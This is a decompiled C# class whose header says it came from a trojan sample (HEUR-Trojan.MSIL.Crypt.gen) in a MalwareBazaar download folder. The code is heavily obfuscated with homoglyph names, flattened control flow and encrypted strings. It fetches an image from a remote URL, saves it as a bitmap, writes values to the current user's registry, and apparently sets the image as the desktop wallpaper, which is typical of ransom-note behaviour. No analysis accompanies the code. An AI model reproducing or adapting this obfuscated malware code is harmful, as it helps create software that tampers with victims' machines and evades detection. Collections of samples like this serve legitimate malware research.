// Decompiled with JetBrains decompiler
// Type: @ԁ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using Microsoft.Win32;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;

internal sealed class \u0040ԁ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string YA9() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0031S8() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ԁ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1;
    if (\u0040ԁ.\u0040Ӥ())
    {
      if (true)
      {
        num1 = 3;
        goto label_3;
      }
    }
    else
      goto label_6;
label_2:
    \u0040ԁ.\u0040Ӗ((object) this);
    goto label_7;
label_3:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_5;
        case 1:
        case 2:
          goto label_2;
        case 4:
          goto label_7;
        default:
          int num2 = 4;
          num1 = \u0040ԁ.\u0040ӥ() ? num2 : num2;
          continue;
      }
    }
label_5:
    \u0040ԁ.\u0040ӕ();
    goto label_2;
label_6:
    num1 = 2;
    if (true)
      goto label_3;
label_7:
    try
    {
      HttpWebResponse httpWebResponse = (HttpWebResponse) \u0040ԁ.\u0040Ә((object) (HttpWebRequest) \u0040ԁ.\u0040ӗ((object) _param2));
      try
      {
        Image image = (Image) \u0040ԁ.\u0040Ӛ((object) (Stream) \u0040ԁ.\u0040ә((object) httpWebResponse));
        string str = (string) \u0040ԁ.\u0040Ӝ((object) \u0040ԝ.\u0040Ծ(), \u0040ԁ.\u0040ӛ(1604), (object) \u0040ԝ.\u0040\u05CB(12), \u0040ԁ.\u0040ӛ(3384));
        \u0040ԁ.\u0040Ӟ((object) image, (object) str, \u0040ԁ.\u0040ӝ());
        try
        {
          RegistryKey registryKey = (RegistryKey) \u0040ԁ.\u0040ӟ((object) Registry.CurrentUser, \u0040ԁ.\u0040ӛ(3396), true);
          \u0040ԁ.\u0040Ӥ();
          int num3 = \u0040ԁ.\u0040ӥ() ? 3 : 4;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 4:
                \u0040ԁ.\u0040Ӡ((object) registryKey, \u0040ԁ.\u0040ӛ(3442), \u0040ԁ.\u0040ӛ(3476));
                num3 = 1;
                continue;
              case 1:
                \u0040ԁ.\u0040Ӡ((object) registryKey, \u0040ԁ.\u0040ӛ(3484), \u0040ԁ.\u0040ӛ(3514));
                break;
              case 5:
                goto label_16;
            }
            \u0040ԁ.\u0040ӡ((object) registryKey);
            num3 = 5;
          }
        }
        catch
        {
        }
label_16:
        \u0040ԝ.\u0040ٴ(20, 0, str, 3);
      }
      finally
      {
        if (httpWebResponse != null)
          \u0040ԁ.\u0040Ӣ((object) httpWebResponse);
      }
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ԁ.\u0040ӣ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(object _param0) => (object) WebRequest.Create((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(object _param0) => (object) ((WebRequest) _param0).GetResponse();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) ((WebResponse) _param0).GetResponseStream();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) Image.FromStream((Stream) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ() => (object) ImageFormat.Bmp;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӟ(object _param0, object _param1, object _param2) => ((Image) _param0).Save((string) _param1, (ImageFormat) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӟ(object _param0, object _param1, bool _param2) => (object) ((RegistryKey) _param0).OpenSubKey((string) _param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӡ(object _param0, object _param1, object _param2) => ((RegistryKey) _param0).SetValue((string) _param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӡ(object _param0) => ((RegistryKey) _param0).Close();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӣ(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӣ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӥ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӥ() => false;
}
